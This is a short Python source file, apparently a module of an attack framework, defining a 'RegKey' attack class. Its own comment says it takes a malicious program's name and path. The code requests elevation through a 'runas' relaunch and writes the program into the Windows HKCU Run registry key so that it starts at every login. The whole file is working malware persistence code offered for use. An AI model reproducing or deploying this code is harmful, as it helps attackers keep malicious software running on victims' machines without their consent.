#When making an attack just provide malacious program name and path and it will add it to startups

import sys
import ctypes
import winreg

from Attack import Attack
class RegKey(Attack): 
    def execute(self, ProgramName, ProgramPath):

        # Add the Windows Calculator to startup
        self.program_name = ProgramName
        self.program_path = ProgramPath

        if ctypes.windll.shell32.IsUserAnAdmin() != 1:
            # Check if the script is running with admin privileges, if not, restart it with admin privileges
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

        try:
            # Open the registry key for startup programs
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE)

            # Set the registry value with the program name and path
            winreg.SetValueEx(key, self.program_name, 0, winreg.REG_SZ, self.program_path)

            # Close the registry key
            winreg.CloseKey(key)

            print(f"Added '{self.program_name}' to startup with path: {self.program_path}")
            return
        except Exception as e:
            return "An error occurred"